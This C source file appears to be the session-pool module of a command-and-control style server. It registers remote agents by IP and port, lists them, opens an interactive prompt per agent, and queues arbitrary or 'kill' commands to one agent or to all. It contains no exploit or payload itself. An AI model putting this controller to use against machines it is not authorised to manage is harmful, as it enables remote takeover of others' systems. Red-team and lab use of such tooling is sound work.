#include "../include/Session.h"
#include <stdio.h>
#include <string.h>

static void ReprintPrompt(SessionPool *P)
{
    if (P->Interactive && P->ActiveId > 0) {
        AgentSession *S = PoolById(P, P->ActiveId);
        if (S) printf("\r\033[Ksession-%d ~$ ", S->Id);
        else   printf("\r\033[Kserver ~$ ");
    } else {
        printf("\r\033[Kserver ~$ ");
    }
    fflush(stdout);
}

void PoolInit(SessionPool *P)
{
    memset(P, 0, sizeof(*P));
    P->NextId      = 1;
    P->Interactive = 0;
    P->ActiveId    = 0;
}

AgentSession *PoolRegister(SessionPool *P, const char *Ip, int SrcPort)
{
    char Peer[AddrSize];
    snprintf(Peer, sizeof(Peer), "%s:%d", Ip, SrcPort);

    for (int I = 0; I < P->Count; I++) {
        AgentSession *S = &P->Slots[I];
        if (S->State == StateActive && strcmp(S->Peer, Peer) == 0) {
            S->LastSeen = time(NULL);
            return S;
        }
    }

    if (P->Count >= MaxSessions) return NULL;

    AgentSession *S = &P->Slots[P->Count];
    memset(S, 0, sizeof(*S));
    S->Id        = P->NextId++;
    S->State     = StateActive;
    S->FirstSeen = time(NULL);
    S->LastSeen  = time(NULL);
    strncpy(S->Address, Ip, AddrSize - 1);
    snprintf(S->Peer, AddrSize, "%s:%d", Ip, SrcPort);
    P->Count++;
    return S;
}

AgentSession *PoolById(SessionPool *P, int Id)
{
    for (int I = 0; I < P->Count; I++)
        if (P->Slots[I].Id == Id && P->Slots[I].State == StateActive)
            return &P->Slots[I];
    return NULL;
}

AgentSession *PoolActive(SessionPool *P)
{
    if (!P->Interactive || P->ActiveId == 0) return NULL;
    return PoolById(P, P->ActiveId);
}

void PoolList(SessionPool *P)
{
    int Found = 0;
    printf("\n");
    printf("  %-4s  %-22s  %-10s  %s\n", "ID", "Address", "State", "Last Seen");
    printf("  %-4s  %-22s  %-10s  %s\n", "----", "----------------------", "----------", "---------");
    for (int I = 0; I < P->Count; I++) {
        AgentSession *S = &P->Slots[I];
        if (S->State != StateActive) continue;
        char Ts[32];
        struct tm *Tm = localtime(&S->LastSeen);
        strftime(Ts, sizeof(Ts), "%H:%M:%S", Tm);
        printf("  %-4d  %-22s  %-10s  %s\n", S->Id, S->Peer, "active", Ts);
        Found = 1;
    }
    if (!Found) printf("  No active sessions.\n");
    printf("\n");
}

void PoolKill(SessionPool *P, int Id)
{
    AgentSession *S = PoolById(P, Id);
    if (!S) { printf("[!] Session %d not found.\n", Id); ReprintPrompt(P); return; }
    PoolQueueCommand(S, "kill");
    S->State = StateDead;
    if (P->ActiveId == Id) { P->Interactive = 0; P->ActiveId = 0; }
    printf("[*] Kill queued for session-%d (%s)\n", Id, S->Peer);
    ReprintPrompt(P);
}

void PoolEnter(SessionPool *P, int Id)
{
    AgentSession *S = PoolById(P, Id);
    if (!S) { printf("[!] Session %d not found.\n", Id); ReprintPrompt(P); return; }
    P->Interactive = 1;
    P->ActiveId    = Id;
    printf("[*] session-%d (%s) — type 'back' to return.\n", Id, S->Peer);
    printf("session-%d ~$ ", Id);
    fflush(stdout);
}

void PoolLeave(SessionPool *P)
{
    P->Interactive = 0;
    P->ActiveId    = 0;
    printf("server ~$ ");
    fflush(stdout);
}

void PoolQueueCommand(AgentSession *S, const char *Cmd)
{
    strncpy(S->Pending, Cmd, BufSize - 1);
    S->Pending[BufSize - 1] = '\0';
    S->HasPending = 1;
}

void PoolExec(SessionPool *P, int Id, const char *Cmd)
{
    AgentSession *S = PoolById(P, Id);
    if (!S) { printf("[!] Session %d not found.\n", Id); ReprintPrompt(P); return; }
    PoolQueueCommand(S, Cmd);
    printf("[*] Queued for session-%d (%s): %s\n", Id, S->Peer, Cmd);
    ReprintPrompt(P);
}

void PoolExecAll(SessionPool *P, const char *Cmd)
{
    int Queued = 0;
    for (int I = 0; I < P->Count; I++) {
        AgentSession *S = &P->Slots[I];
        if (S->State != StateActive) continue;
        PoolQueueCommand(S, Cmd);
        printf("[*] Queued for session-%d (%s)\n", S->Id, S->Peer);
        Queued++;
    }
    if (!Queued) printf("[!] No active sessions.\n");
    else         printf("[*] Command queued for %d agent(s): %s\n", Queued, Cmd);
    ReprintPrompt(P);
}

void PoolNotifyConnect(SessionPool *P, AgentSession *S)
{
    printf("\r\033[K[+] session-%d connected: %s\n", S->Id, S->Peer);
    ReprintPrompt(P);
}

void PoolNotifyOutput(SessionPool *P, AgentSession *S)
{
    printf("\r\033[K[session-%d | %s]\n%s\n", S->Id, S->Peer, S->LastOutput);
    ReprintPrompt(P);
}
